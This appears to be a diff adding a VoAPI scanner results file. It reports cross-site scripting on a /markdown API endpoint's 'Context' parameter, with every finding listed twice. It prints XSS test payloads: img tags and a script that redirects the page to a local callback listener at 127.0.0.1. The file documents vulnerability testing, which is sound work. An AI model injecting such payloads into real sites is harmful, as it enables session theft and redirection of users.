@@ -1,0 +1,39 @@
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /markdown
+Vul API Method: Post
+API Vul Param: Context
+API Test Payload: <img src='http://127.0.0.1:4444/xss/markdownVoAPIContext'>
+
+API Vul Type: xss
+Vul API Url: /markdown
+Vul API Method: Post
+API Vul Param: Context
+API Test Payload: <img src='http://127.0.0.1:4444/xss/markdownVoAPIContext'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /markdown
+Vul API Method: Post
+API Vul Param: Context
+API Test Payload: <img src='https://127.0.0.1:4445/xss/markdownVoAPIContext'>
+
+API Vul Type: xss
+Vul API Url: /markdown
+Vul API Method: Post
+API Vul Param: Context
+API Test Payload: <img src='https://127.0.0.1:4445/xss/markdownVoAPIContext'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /markdown
+Vul API Method: Post
+API Vul Param: Context
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/markdownVoAPIContext'</script>
+
+API Vul Type: xss
+Vul API Url: /markdown
+Vul API Method: Post
+API Vul Param: Context
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/markdownVoAPIContext'</script>
+
